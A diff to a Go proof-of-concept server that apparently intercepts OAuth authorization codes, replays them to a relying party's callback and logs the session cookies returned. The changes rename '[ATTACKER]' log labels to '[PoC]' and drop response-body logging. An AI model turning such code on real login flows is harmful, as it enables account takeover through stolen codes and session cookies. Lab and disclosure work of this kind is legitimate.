@@ -17,7 +17,7 @@ func main() {
 	mux.HandleFunc("/callback", callback)
 	mux.HandleFunc("/capture", capture)
 
-	log.Println("Attacker listening on http://127.0.0.1:9000")
+	log.Println("PoC listening on http://127.0.0.1:9000")
 
 	if err := http.ListenAndServe(":9000", mux); err != nil {
 		log.Fatal(err)
@@ -29,7 +29,7 @@ func home(w http.ResponseWriter, r *http.Request) {
 
 
 	
-		<h1>Attacker server</h1>
+		<h1>PoC server</h1>
 		<p>Laboratory server.</p>
 	`)
 }
@@ -43,7 +43,7 @@ func callback(w http.ResponseWriter, r *http.Request) {
 	}
 
 	log.Println("================================")
-	log.Println("[ATTACKER] authorization code:")
+	log.Println("[PoC] authorization code:")
 	log.Println(code)
 	log.Println("================================")
 
@@ -88,12 +88,12 @@ func callback(w http.ResponseWriter, r *http.Request) {
 
 	body, _ := io.ReadAll(resp.Body)
 
-	log.Println("[ATTACKER] RP status:", resp.Status)
+	log.Println("[PoC] RP status:", resp.Status)
 
 	// Вот ключевой момент.
 	setCookie := resp.Header.Get("Set-Cookie")
 
-	log.Println("[ATTACKER] Set-Cookie:")
+	log.Println("[PoC] Set-Cookie:")
 	log.Println(setCookie)
 
 	fmt.Fprintf(w, `
@@ -131,7 +131,7 @@ func capture(w http.ResponseWriter, r *http.Request) {
 
 	log.Println()
 	log.Println("======================================")
-	log.Println("[ATTACKER] AUTHORIZATION CODE RECEIVED")
+	log.Println("[PoC] AUTHORIZATION CODE RECEIVED")
 	log.Println(code)
 	log.Println("======================================")
 
@@ -145,7 +145,7 @@ func capture(w http.ResponseWriter, r *http.Request) {
 }
 
 func completeOAuth(code string) {
-	log.Println("[ATTACKER] Calling RP callback...")
+	log.Println("[PoC] Calling RP callback...")
 
 	params := url.Values{}
 
@@ -160,7 +160,7 @@ func completeOAuth(code string) {
 	)
 
 	if err != nil {
-		log.Println("[ATTACKER] request creation:", err)
+		log.Println("[PoC] request creation:", err)
 		return
 	}
 
@@ -181,22 +181,17 @@ func completeOAuth(code string) {
 	resp, err := client.Do(req)
 
 	if err != nil {
-		log.Println("[ATTACKER] RP request:", err)
+		log.Println("[PoC] RP request:", err)
 		return
 	}
 
 	defer resp.Body.Close()
 
-	body, _ := io.ReadAll(resp.Body)
-
-	log.Println("[ATTACKER] RP status:", resp.Status)
+	log.Println("[PoC] RP status:", resp.Status)
 
 	log.Println()
 	log.Println("======================================")
-	log.Println("[ATTACKER] RP SET-COOKIE")
+	log.Println("[PoC] COOKIE")
 	log.Println(resp.Header.Values("Set-Cookie"))
 	log.Println("======================================")
-
-	log.Println("[ATTACKER] RP response:")
-	log.Println(string(body))
 }
